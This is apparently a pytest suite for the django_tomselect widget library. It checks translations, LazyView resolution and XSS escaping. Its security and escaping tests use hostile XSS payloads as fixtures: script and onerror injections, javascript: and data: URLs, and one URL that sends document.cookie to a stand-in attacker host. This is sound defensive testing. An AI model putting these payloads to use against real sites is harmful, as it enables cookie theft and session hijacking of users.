"""Tests for TomSelect widget security/XSS protection, HTML escaping, translations, and LazyView resolution."""

import pytest
from bs4 import BeautifulSoup
from django.urls import reverse_lazy
from django.urls.exceptions import NoReverseMatch
from django.utils import translation
from django.utils.translation import gettext as _
from django.utils.translation import gettext_lazy as _lazy

from django_tomselect.app_settings import (
    PluginClearButton,
    PluginDropdownFooter,
    PluginDropdownHeader,
    PluginDropdownInput,
    PluginRemoveButton,
    TomSelectConfig,
)
from django_tomselect.autocompletes import AutocompleteModelView
from django_tomselect.lazy_utils import LazyView
from django_tomselect.widgets import (
    TomSelectIterablesWidget,
    TomSelectModelMultipleWidget,
    TomSelectModelWidget,
)
from example_project.example.models import Edition


@pytest.mark.django_db
class TestWidgetTranslations:
    """Test translation handling in TomSelect widgets."""

    def test_dropdown_header_translations(self):
        """Test translation of dropdown header labels."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select an Edition"),
                value_field_label=_("ID"),
                label_field_label=_lazy("Edition Name"),
                extra_columns={
                    "year": _("Publication Year"),
                    "pages": _lazy("Page Count"),
                },
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert header["title"] == "Select an Edition"
        assert header["value_field_label"] == "ID"
        assert header["label_field_label"] == "Edition Name"
        assert "Publication Year" in header["extra_headers"]
        assert "Page Count" in header["extra_headers"]

    def test_plugin_button_translations(self):
        """Test translation of plugin button labels."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_clear_button=PluginClearButton(title=_("Clear Selection")),
            plugin_remove_button=PluginRemoveButton(title=_lazy("Remove Item"), label=_("×")),
            plugin_dropdown_footer=PluginDropdownFooter(
                title=_lazy("Available Actions"), list_view_label=_("View All"), create_view_label=_lazy("Create New")
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        plugins = context["widget"]["plugins"]
        assert plugins["clear_button"]["title"] == "Clear Selection"
        assert plugins["remove_button"]["title"] == "Remove Item"
        assert plugins["remove_button"]["label"] == "×"
        assert plugins["dropdown_footer"]["title"] == "Available Actions"
        assert plugins["dropdown_footer"]["list_view_label"] == "View All"
        assert plugins["dropdown_footer"]["create_view_label"] == "Create New"

    def test_mixed_translation_methods(self):
        """Test mixing gettext and gettext_lazy in the same configuration."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select Item"),
                value_field_label=_("Value"),
                label_field_label=_lazy("Label"),
                extra_columns={"col1": _("Column 1"), "col2": _lazy("Column 2")},
            ),
            plugin_clear_button=PluginClearButton(title=_("Clear")),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        plugins = context["widget"]["plugins"]
        header = plugins["dropdown_header"]

        # Test lazy translations
        assert header["title"] == "Select Item"
        assert header["label_field_label"] == "Label"
        assert "Column 2" in header["extra_headers"]

        # Test immediate translations
        assert header["value_field_label"] == "Value"
        assert "Column 1" in header["extra_headers"]
        assert plugins["clear_button"]["title"] == "Clear"

    def test_placeholder_translation(self):
        """Test translation of placeholder text."""
        config = TomSelectConfig(url="autocomplete-edition", placeholder=_lazy("Choose an edition..."))
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        assert context["widget"]["placeholder"] == "Choose an edition..."

    def test_translation_with_variables(self):
        """Test translations containing variables."""
        item_count = 5
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                title=_lazy("Select up to %(count)d items") % {"count": item_count},
                value_field_label=_("ID #%(num)d") % {"num": 1},
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert header["title"] == "Select up to 5 items"
        assert header["value_field_label"] == "ID #1"

    def test_nested_translation_dictionary(self):
        """Test handling of nested translations in dictionary structures."""
        config = TomSelectConfig(
            url="autocomplete-edition",
            plugin_dropdown_header=PluginDropdownHeader(
                extra_columns={"status": _lazy("Status"), "info": _("Information"), "details": _lazy("Details")}
            ),
        )
        widget = TomSelectModelWidget(config=config)
        context = widget.get_context("test", None, {})

        header = context["widget"]["plugins"]["dropdown_header"]
        assert "Status" in header["extra_headers"]
        assert "Information" in header["extra_headers"]
        assert "Details" in header["extra_headers"]

        # Verify the corresponding values are in extra_values
        assert "status" in header["extra_values"]
        assert "info" in header["extra_values"]
        assert "details" in header["extra_values"]

    # Per-locale expected strings for the parametrized translation tests below.
    # Keys map to specific template render slots; values are the translated strings.
    _LOCALE_STRINGS = {
        "de": {
            "loading": "Wird geladen",
            "loading_more": "Weitere Ergebnisse werden geladen...",
            "no_more_results": "Keine weiteren Ergebnisse",
            "no_results": "Keine Ergebnisse gefunden für",
            "selected": "Ausgewählt",
            "item_removed": "Eintrag entfernt",
            "timeout": "Die Anfrage hat das Zeitlimit überschritten. Bitte versuchen Sie es erneut.",
            "load_failed": "Optionen konnten nicht geladen werden. Bitte versuchen Sie es erneut.",
            "not_loading_prefix": "Geben Sie mindestens",
            "not_loading_suffix": "Zeichen ein, um zu suchen",
            "add": "Hinzufügen",
        },
        "es": {
            "loading": "Cargando",
            "loading_more": "Cargando más resultados...",
            "no_more_results": "No hay más resultados",
            "no_results": "No se encontraron resultados para",
            "selected": "Seleccionado",
            "item_removed": "Registro eliminado",
            "timeout": "La solicitud excedió el tiempo límite. Inténtelo de nuevo.",
            "load_failed": "Error al cargar las opciones. Inténtelo de nuevo.",
            "not_loading_prefix": "Escriba al menos",
            "not_loading_suffix": "caracteres para buscar",
            "add": "Añadir",
        },
        "pt": {
            "loading": "A carregar",
            "loading_more": "A carregar mais resultados...",
            "no_more_results": "Sem mais resultados",
            "no_results": "Sem resultados encontrados para",
            "selected": "Selecionado",
            "item_removed": "Registo eliminado",
            "timeout": "O pedido excedeu o tempo limite. Tente novamente.",
            "load_failed": "Falha a carregar opções. Tente novamente.",
            "not_loading_prefix": "Introduza pelo menos",
            "not_loading_suffix": "caracteres para pesquisar",
            "add": "Adicionar",
        },
        "ru": {
            "loading": "Загрузка",
            "loading_more": "Загрузка дополнительных результатов...",
            "no_more_results": "Больше результатов нет",
            "no_results": "Результаты не найдены для",
            "selected": "Выбрано",
            "item_removed": "Запись удалена",
            "timeout": "Время ожидания запроса истекло. Попробуйте снова.",
            "load_failed": "Не удалось загрузить параметры. Попробуйте снова.",
            "not_loading_prefix": "Введите не менее",
            "not_loading_suffix": "символов для поиска",
            "add": "Добавить",
        },
    }

    @pytest.mark.parametrize("locale", ["de", "es", "pt", "ru"])
    def test_locale_render_templates_basic(self, locale):
        """Verify that each supported locale is applied to the rendered widget output.

        Covers templates rendered unconditionally for any widget:
        loading.html, loading_more.html, no_more_results.html, no_results.html,
        and strings in tomselect.html (selected, item-removed, timeout/error messages).
        """
        expected = self._LOCALE_STRINGS[locale]
        widget = TomSelectModelWidget(config=TomSelectConfig(url="autocomplete-edition"))
        translation.activate(locale)
        try:
            out = widget.render("test", None)
        finally:
            translation.deactivate()

        assert expected["loading"] in out, f"loading.html: 'Loading' not translated to {locale}"
        assert expected["loading_more"] in out, f"loading_more.html: 'Loading more results...' not translated to {locale}"
        assert expected["no_more_results"] in out, f"no_more_results.html: 'No more results' not translated to {locale}"
        assert expected["no_results"] in out, f"no_results.html: 'No results found for' not translated to {locale}"
        assert expected["selected"] in out, f"tomselect.html: 'selected' not translated to {locale}"
        assert expected["item_removed"] in out, f"tomselect.html: 'Item removed' not translated to {locale}"
        assert expected["timeout"] in out, f"tomselect.html: timeout message not translated to {locale}"
        assert expected["load_failed"] in out, f"tomselect.html: load failure message not translated to {locale}"

    @pytest.mark.parametrize("locale", ["de", "es", "pt", "ru"])
    def test_locale_not_loading_template(self, locale):
        """Verify the not_loading.html minimum-query hint is translated for each locale."""
        expected = self._LOCALE_STRINGS[locale]
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", minimum_query_length=2)
        )
        translation.activate(locale)
        try:
            out = widget.render("test", None)
        finally:
            translation.deactivate()

        assert expected["not_loading_prefix"] in out, f"not_loading.html: prefix not translated to {locale}"
        assert expected["not_loading_suffix"] in out, f"not_loading.html: suffix not translated to {locale}"

    @pytest.mark.parametrize("locale", ["de", "es", "pt", "ru"])
    def test_locale_option_create_template(self, locale):
        """Verify the option_create.html 'Add' label is translated for each locale."""
        expected = self._LOCALE_STRINGS[locale]
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", create=True)
        )
        translation.activate(locale)
        try:
            out = widget.render("test", None)
        finally:
            translation.deactivate()

        assert expected["add"] in out, f"option_create.html: 'Add' not translated to {locale}"

    def test_english_strings_present_without_active_locale(self):
        """Verify English strings appear in the rendered output when no locale is active."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", minimum_query_length=2)
        )
        out = widget.render("test", None)

        assert "Loading" in out
        assert "Loading more results..." in out
        assert "No more results" in out
        assert "No results found for" in out
        assert "Type at least" in out
        assert "characters to search" in out


@pytest.mark.django_db
class TestWidgetSecurity:
    """Security tests for TomSelect widgets."""

    @pytest.fixture
    def malicious_edition(self):
        """Create an edition with various malicious content."""
        edition = Edition.objects.create(
            name='Attack Vector <img src="x" onerror="alert(1)">',
            year="<script>document.cookie</script>",
            pages='100" onmouseover="alert(2)',
            pub_num="javascript:alert(3)",
        )
        yield edition
        edition.delete()

    @pytest.fixture
    def setup_complex_widget(self):
        """Create widget with complex configuration for thorough testing."""

        def _create_widget(show_urls=True, with_plugins=True):
            config_kwargs = {
                "url": "autocomplete-edition",
                "value_field": "id",
                "label_field": "name",
            }

            # Add URL display options if requested
            if show_urls:
                config_kwargs.update(
                    {
                        "show_detail": True,
                        "show_update": True,
                        "show_delete": True,
                    }
                )

            # Add plugin configurations if requested
            if with_plugins:
                config_kwargs.update(
                    {
                        "plugin_dropdown_header": PluginDropdownHeader(
                            show_value_field=True, extra_columns={"year": "Year", "pub_num": "Publication #"}
                        ),
                        "plugin_dropdown_footer": PluginDropdownFooter(
                            title="Options",
                        ),
                        "plugin_clear_button": PluginClearButton(),
                        "plugin_remove_button": PluginRemoveButton(),
                    }
                )

            return TomSelectModelWidget(config=TomSelectConfig(**config_kwargs))

        return _create_widget

    def test_render_option_template_escaping(self):
        """Test escaping in the option template for dropdown choices."""
        # This test specifically targets the option.html template for search results
        widget = TomSelectModelWidget(
            config=TomSelectConfig(
                url="autocomplete-edition",
                value_field="id",
                label_field="name",
                plugin_dropdown_header=PluginDropdownHeader(show_value_field=True),
            )
        )

        # Get the rendered widget and look for proper escaping in templates
        full_render = widget.render("test_field", None)

        # Check that the option template uses escape function on the label field.
        # The decodeIfNeeded() inner wrap is the current implementation; the bare
        # escape() patterns are retained here to keep this assertion permissive
        # if the wrapping is ever refactored.
        assert (
            "escape(decodeIfNeeded(data[this.settings.labelField]))" in full_render
            or "${escape(data[this.settings.labelField])}" in full_render
            or "${data[this.settings.labelField]}" in full_render
            or "escape(data[this.settings.labelField])" in full_render
        )

    def test_javascript_url_escaping(self, setup_complex_widget, malicious_edition, monkeypatch):
        """Test that javascript: URLs are properly escaped in href attributes."""
        widget = setup_complex_widget(show_urls=True)

        # Mock methods to return javascript: URLs
        def mock_url(view_name, args=None):
            return "javascript:alert('hijacked');"

        # Override the reverse function to return our malicious URLs
        monkeypatch.setattr("django_tomselect.widgets.safe_reverse", mock_url)

        # Render the widget with a malicious edition
        rendered = widget.render("test_field", malicious_edition.pk)

        # Parse the output
        soup = BeautifulSoup(rendered, "html.parser")

        # Check that no unescaped javascript: URLs exist in href attributes
        for a_tag in soup.find_all("a"):
            if "href" in a_tag.attrs:
                assert not a_tag["href"].startswith("javascript:")

        # Check that script strings are properly escaped in the output
        assert "javascript:alert('hijacked');" not in rendered
        assert "javascript:" not in rendered or "javascript\\:" in rendered

    def test_unsafe_object_properties(self, malicious_edition):
        """Test that unsafe object properties can't be exploited."""
        # Create an object with properties that could be dangerous if not escaped
        malicious_edition.name = "Safe Name"
        malicious_edition.__proto__ = {"dangerous": "property"}
        malicious_edition.constructor = {"dangerous": "constructor"}
        malicious_edition.__defineGetter__ = lambda x: "exploit"

        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", value_field="id", label_field="name")
        )

        # This should not cause any errors or vulnerabilities
        try:
            rendered = widget.render("test_field", malicious_edition.pk)
            # If we get here without error, that's good
            assert rendered is not None
        except Exception as e:
            pytest.fail(f"Widget rendering failed with: {e}")

    def test_dropdown_inputs_sanitization(self, setup_complex_widget):
        """Test that inputs in dropdown are properly sanitized."""
        widget = setup_complex_widget(with_plugins=True)

        # Add the dropdown_input plugin which renders an input in the dropdown
        widget.plugin_dropdown_input = PluginDropdownInput()

        # Render the widget (no need for a value)
        rendered = widget.render("test_field", None)

        # Look for proper escaping in the dropdown input elements
        assert "escape(" in rendered

        # Make sure event handlers on inputs are sanitized
        assert 'input onkeyup="' not in rendered
        assert 'input onchange="' not in rendered
        assert 'input onfocus="' not in rendered


@pytest.mark.django_db
class TestWidgetEscaping:
    """Tests for proper HTML escaping in TomSelect widgets."""

    @pytest.fixture
    def html_content_edition(self):
        """Create an edition with HTML content in name field."""
        edition = Edition.objects.create(
            name='Test <b>Bold</b> & <script>alert("XSS")</script>', year="Year with <span>HTML</span>", pages=100
        )
        yield edition
        edition.delete()

    @pytest.fixture
    def mock_request(self):
        """Create a mock request with all needed attributes."""

        class MockUser:
            is_authenticated = True
            id = 1

            def has_perms(self, perms):
                return True

        class MockRequest:
            user = MockUser()
            method = "GET"
            GET = {}

            def get_full_path(self):
                return "/test/"

        return MockRequest()

    def test_option_template_escaping(self):
        """Test that HTML is properly escaped in the option template."""
        from django.template import Context, Template

        html_data = {"name": 'Option with <b>HTML</b> & <script>alert("XSS")</script>', "id": 1}

        # Create template that mimics the option.html template
        template_content = """
        {% include "django_tomselect/helpers/decode_if_needed.html" %}

        {% if widget.is_tabular %}
            <div class="row" role="row">
            {% if widget.plugins.dropdown_header.show_value_field %}
                <div class="col" role="gridcell">${escape(data[this.settings.valueField])}</div>
                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
            {% else %}
                <div class="col" role="gridcell">${escape(data[this.settings.labelField])}</div>
            {% endif %}
            </div>
        {% else %}
            {% comment %} Here we would use escape function in JavaScript {% endcomment %}
            <div role="option">${escape(decodeIfNeeded(data.name))}</div>
        {% endif %}
        """

        # Create minimal context with potentially unsafe data
        context = Context(
            {
                "widget": {
                    "is_tabular": False,
                    "plugins": {
                        "dropdown_header": {
                            "show_value_field": False,
                        }
                    },
                },
                "data": html_data,
            }
        )

        template = Template(template_content)
        rendered = template.render(context)

        # Verify the template uses proper escaping syntax
        assert "${escape(" in rendered
        assert "decodeIfNeeded(" in rendered

    def test_tabular_option_decodes_entities_before_escape(self):
        """Regression: the tabular option branch must round-trip server-side HTML entities.

        AutocompleteModelView HTML-escapes string fields server-side (utils.safe_escape) as
        XSS defense in depth, so "Food & Drink" arrives on the wire as "Food &amp; Drink".
        The default (non-tabular) branch, item.html, and optgroup_header.html all pipe
        values through decodeIfNeeded() before escape() so the &amp; round-trips to a
        single &amp; in the DOM (which the browser renders as "&").

        The tabular branch (rendered when plugin_dropdown_header is configured) previously
        omitted decodeIfNeeded(), producing &amp;amp; in the DOM and visibly displaying
        "Food &amp; Drink" to the user. See the filter-by-category demo.
        """
        from django.template.loader import render_to_string

        rendered = render_to_string(
            "django_tomselect/render/option.html",
            {
                "widget": {
                    "is_tabular": True,
                    "label_field": "name",
                    "attrs": {},
                    "plugins": {
                        "dropdown_header": {
                            "show_value_field": True,
                            "extra_values": ["parent_name", "direct_articles"],
                        }
                    },
                }
            },
        )

        assert "escape(decodeIfNeeded(data[this.settings.labelField]))" in rendered
        assert "escape(decodeIfNeeded(data[this.settings.valueField]))" in rendered
        assert "escape(decodeIfNeeded(data['parent_name'] || ''))" in rendered
        assert "escape(decodeIfNeeded(data['direct_articles'] || ''))" in rendered

        # The bare-escape pattern (the bug) must not appear anywhere in the tabular branch.
        assert "escape(data[this.settings.labelField])" not in rendered
        assert "escape(data[this.settings.valueField])" not in rendered
        assert "escape(data['parent_name']" not in rendered

    def test_decode_if_needed_preserves_non_strings(self):
        """Regression: decodeIfNeeded must not blank non-string inputs.

        Now that the tabular branch wraps every column in decodeIfNeeded() - including
        numeric extra_values like direct_articles=12 - the helper can no longer return
        '' for non-string inputs (the previous behavior). It must return null/undefined
        as '' but pass numbers, booleans, etc. through unchanged so escape(String(value))
        on the JS side still gets the right value.
        """
        from django.template.loader import render_to_string

        helper = render_to_string("django_tomselect/helpers/decode_if_needed.html", {})

        # Null/undefined still collapse to ''.
        assert "str === undefined" in helper or "str == null" in helper or "str === null" in helper

        # The old guard 'typeof str !== \\'string\\' return \\'\\'' must be gone - it would
        # silently blank numeric extra columns when they pass through decodeIfNeeded().
        assert "typeof str !== 'string') return ''" not in helper

    def test_decode_if_needed_matches_hex_numeric_entities(self):
        """Regression: decodeIfNeeded must detect hex numeric entities like &#x27;.

        Django's escape() (called by utils.safe_escape on every string field server-side)
        emits hex numeric entities for apostrophes since Django 3.0: "Fiona O'Brien" becomes
        "Fiona O&#x27;Brien" on the wire. The previous regex `&[a-z]+;|&#[0-9]+;` matched
        only named entities (&amp;) and decimal numeric entities (&#39;), silently skipping
        hex entities. That left them in the string, which Tom Select's escape() then
        re-escaped to "Fiona O&amp;#x27;Brien" - rendered by the browser as the literal
        text "Fiona O&#x27;Brien". Affected every author/category/etc. with an apostrophe
        in the default item.html, optgroup_header.html, and non-tabular option.html branches
        (e.g. the Exclude-By Primary Author and Weighted Author Search demos).

        We extract the regex literal from the rendered helper and exercise it directly,
        translating JS-style /pattern/i to a Python re flag - the character classes used
        here are the common subset of JS and Python regex syntax, so the same pattern
        validates both.
        """
        import re as _re

        from django.template.loader import render_to_string

        helper = render_to_string("django_tomselect/helpers/decode_if_needed.html", {})

        match = _re.search(r"/([^/]+)/i\.test\(str\)", helper)
        assert match, "Could not extract entity-detection regex from decode_if_needed.html"
        pattern = _re.compile(match.group(1), _re.IGNORECASE)

        # Hex numeric entities (Django's apostrophe escape and friends).
        assert pattern.search("Fiona O&#x27;Brien")
        assert pattern.search("&#x2F;")  # forward slash, also hex-escaped
        assert pattern.search("UPPER &#X27; CASE")  # case-insensitive hex digits

        # Existing matches must keep working.
        assert pattern.search("Food &amp; Drink")  # named entity
        assert pattern.search("&#39;")  # decimal numeric entity

        # Plain text without entities must NOT match (would force needless decode).
        assert not pattern.search("Fiona OBrien")
        assert not pattern.search("just plain text")

    def test_url_escaping_in_templates(self):
        """Test that URLs with JavaScript are properly sanitized in templates."""
        from django_tomselect.utils import safe_url

        # Test various potentially unsafe URLs
        unsafe_urls = [
            "javascript:alert('XSS')",
            "javascript:void(document.location='https://attacker.com?cookie='+document.cookie)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:alert(document.domain)",
        ]

        for url in unsafe_urls:
            result = safe_url(url)
            # URLs should either be None or properly sanitized
            assert result is None or "javascript:" not in result

    def test_get_label_for_object(self, html_content_edition):
        """Test that get_label_for_object properly escapes HTML."""
        widget = TomSelectModelWidget(
            config=TomSelectConfig(url="autocomplete-edition", value_field="id", label_field="name")
        )

        # Create a minimal mock autocomplete view
        class MockView:
            pass

        label = widget.get_label_for_object(html_content_edition, MockView())

        # Verify HTML is properly escaped
        assert "&lt;b&gt;Bold&lt;/b&gt;" in label
        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in label  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in label  # Ensure no double escaping

    def test_safe_escape_utility(self, html_content_edition):
        """Test that the safe_escape utility properly escapes HTML."""
        from django_tomselect.utils import safe_escape

        html_value = html_content_edition.name
        escaped = safe_escape(html_value)

        # Verify HTML is properly escaped
        assert "&lt;b&gt;Bold&lt;/b&gt;" in escaped
        assert "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;" in escaped  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in escaped  # Ensure no double escaping

    def test_sanitize_dict_escaping(self, html_content_edition):
        """Test that sanitize_dict properly escapes HTML in dictionary values."""
        from django_tomselect.utils import sanitize_dict

        data = {
            "name": html_content_edition.name,
            "details": f"<div>Details about {html_content_edition.name}</div>",
            "nested": {"html_content": '<script>alert("Nested")</script>'},
        }

        sanitized = sanitize_dict(data)

        # Verify HTML is properly escaped in all levels
        assert "&lt;b&gt;Bold&lt;/b&gt;" in sanitized["name"]
        assert "&lt;div&gt;Details about" in sanitized["details"]
        assert (
            "&lt;script&gt;alert(&quot;Nested&quot;)&lt;/script&gt;" in sanitized["nested"]["html_content"]
        )  # Fixed: &quot; instead of "
        assert "&amp;lt;" not in sanitized["name"]  # Ensure no double escaping

    def test_dropdown_header_template_escaping(self):
        """Test that HTML in dropdown headers is properly escaped in the template."""
        from django.template import Context, Template

        # Create minimal context with potentially unsafe header content
        context = Context(
            {
                "widget": {
                    "plugins": {
                        "dropdown_header": {
                            "title": "Header with <b>HTML</b>",
                            "value_field_label": 'ID with <script>alert("XSS")</script>',
                            "label_field_label": "Name with <i>HTML</i>",
                            "header_class": "header-class",
                            "title_row_class": "row",
                            "extra_headers": ["Year with <u>HTML</u>"],
                            "extra_values": ["year"],
                        }
                    }
                }
            }
        )

        # Load the actual dropdown_header template used by the widget
        template_content = """
        {% load i18n %}

        <div class="{{ widget.plugins.dropdown_header.header_class }}"
            title="{{ widget.plugins.dropdown_header.title|escapejs }}" role="row">
            <div class="{{ widget.plugins.dropdown_header.title_row_class }}">
                <div class="col">
                    <span role="columnheader">{{ widget.plugins.dropdown_header.value_field_label|escapejs }}</span>
                </div>
                <div class="col">
                    <span role="columnheader">{{ widget.plugins.dropdown_header.label_field_label|escapejs }}</span>
                </div>
                {% for header_text in widget.plugins.dropdown_header.extra_headers %}
                <div class="col">
                    <span role="columnheader">{{ header_text|escapejs }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        """

        template = Template(template_content)
        rendered = template.render(context)

        # Check that HTML in headers is properly escaped
        assert 'title="Header with \\u003Cb\\u003EHTML\\u003C/b\\u003E"' in rendered
        assert "ID with \\u003Cscript\\u003Ealert(\\u0022XSS\\u0022)\\u003C/script\\u003E" in rendered
        assert "Name with \\u003Ci\\u003EHTML\\u003C/i\\u003E" in rendered
        assert "Year with \\u003Cu\\u003EHTML\\u003C/u\\u003E" in rendered


@pytest.mark.django_db
class TestLazyViewInWidgets:
    """Tests for LazyView usage in TomSelect widgets."""

    @pytest.fixture(autouse=True)
    def setup_test(self):
        """Set up test environment."""
        self.basic_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="name",
        )
        self.edition_model_widget = TomSelectModelWidget(config=self.basic_config)
        self.iterables_widget = TomSelectIterablesWidget(config=self.basic_config)

    def test_get_lazy_view_model_widget(self):
        """Test that get_lazy_view returns a LazyView instance for model widget."""
        lazy_view = self.edition_model_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_lazy_view_iterables_widget(self):
        """Test that get_lazy_view returns a LazyView instance for iterables widget."""
        lazy_view = self.iterables_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_autocomplete_url_from_lazy_view(self):
        """Test that get_autocomplete_url uses the LazyView to get the URL."""
        url = self.edition_model_widget.get_autocomplete_url()
        expected_url = reverse_lazy("autocomplete-edition")

        assert url == expected_url

    def test_lazy_view_caching(self):
        """Test that the LazyView instance is cached."""
        # Get the LazyView instance twice
        lazy_view1 = self.edition_model_widget.get_lazy_view()
        lazy_view2 = self.edition_model_widget.get_lazy_view()

        # They should be the same instance
        assert lazy_view1 is lazy_view2

    def test_get_queryset_from_lazy_view(self, monkeypatch):
        """Test that get_queryset uses the LazyView to get the queryset."""
        # Create a mock queryset
        mock_queryset = Edition.objects.all()

        # Create a mock lazy_view that returns a view with our mock queryset
        class MockLazyView(LazyView):
            """Mock LazyView that returns a view with our mock queryset."""

            def get_queryset(self):
                """Return the mock queryset."""
                return mock_queryset

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the queryset and check it's our mock queryset
        queryset = self.edition_model_widget.get_queryset()
        assert queryset is mock_queryset

    def test_invalid_url_in_lazy_view(self, monkeypatch):
        """Test handling of invalid URL in LazyView."""
        # Create a mock lazy_view that raises NoReverseMatch
        class MockLazyView(LazyView):
            """Mock LazyView that raises NoReverseMatch."""

            def get_url(self):
                """Raise NoReverseMatch."""
                raise NoReverseMatch("Test error")

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("invalid-url"))

        # Check that get_autocomplete_url raises NoReverseMatch
        with pytest.raises(NoReverseMatch):
            self.edition_model_widget.get_autocomplete_url()

    def test_multiple_widget_with_lazy_view(self):
        """Test that multiple widgets also use LazyView correctly."""
        multiple_widget = TomSelectModelMultipleWidget(config=self.basic_config)
        lazy_view = multiple_widget.get_lazy_view()

        assert isinstance(lazy_view, LazyView)
        assert lazy_view.url_name == "autocomplete-edition"

    def test_get_autocomplete_view_from_lazy_view(self, monkeypatch):
        """Test that get_autocomplete_view uses the LazyView to get the view."""
        # Create a mock view class that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view for testing."""

            value_fields = ["id", "name"]
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(self.edition_model_widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view and check it's our mock view
        view = self.edition_model_widget.get_autocomplete_view()
        assert isinstance(view, MockView)

    def test_get_model_from_lazy_view(self, monkeypatch):
        """Test that get_model uses the LazyView to get the model."""
        # Directly set the model on the choices object
        class MockChoices:
            """Mock choices with the Edition model."""

            model = Edition

        # Create a widget with mock choices
        widget = TomSelectModelWidget(config=self.basic_config)
        widget.choices = MockChoices()

        # Get the model and check it's our Edition model
        model = widget.get_model()
        assert model is Edition

    def test_label_field_added_to_value_fields(self, monkeypatch):
        """Test that the label_field is added to the view's value_fields."""
        # Create a mock view with value_fields that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view with value_fields."""

            value_fields = ["id"]
            virtual_fields = []
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Create a widget with a different label_field
        custom_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="custom_field",  # Not in value_fields
        )
        widget = TomSelectModelWidget(config=custom_config)

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view
        view = widget.get_autocomplete_view()

        # Check that the label_field was added to value_fields
        assert "custom_field" in view.value_fields

    def test_virtual_fields_for_nonexistent_label_field(self, monkeypatch):
        """Test that nonexistent label fields are added to virtual_fields."""
        # Create a mock view with value_fields that inherits from AutocompleteModelView
        class MockView(AutocompleteModelView):
            """Mock view with value_fields."""

            value_fields = ["id"]
            virtual_fields = []
            model = Edition
            search_lookups = []

            def setup(self, request, *args, **kwargs):
                """Mock setup method."""
                super().setup(request, *args, **kwargs)

            def get_queryset(self):
                """Mock get_queryset method."""
                return Edition.objects.all()

        # Create a mock lazy_view that returns our mock view and the Edition model
        class MockLazyView(LazyView):
            """Mock LazyView that returns our mock view and model."""

            def get_view(self):
                """Return the mock view."""
                return MockView()

            def get_model(self):
                """Return the Edition model."""
                return Edition

        # Create a widget with a nonexistent label_field
        custom_config = TomSelectConfig(
            url="autocomplete-edition",
            value_field="id",
            label_field="nonexistent_field",  # Doesn't exist in Edition model
        )
        widget = TomSelectModelWidget(config=custom_config)

        # Patch the get_lazy_view method to return our mock lazy_view
        monkeypatch.setattr(widget, "get_lazy_view", lambda: MockLazyView("autocomplete-edition"))

        # Get the view
        view = widget.get_autocomplete_view()

        # Check that the nonexistent label_field was added to virtual_fields
        assert "nonexistent_field" in view.virtual_fields
